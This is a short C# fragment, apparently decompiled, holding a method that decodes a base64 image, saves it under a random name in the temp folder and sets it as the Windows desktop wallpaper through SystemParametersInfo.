	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
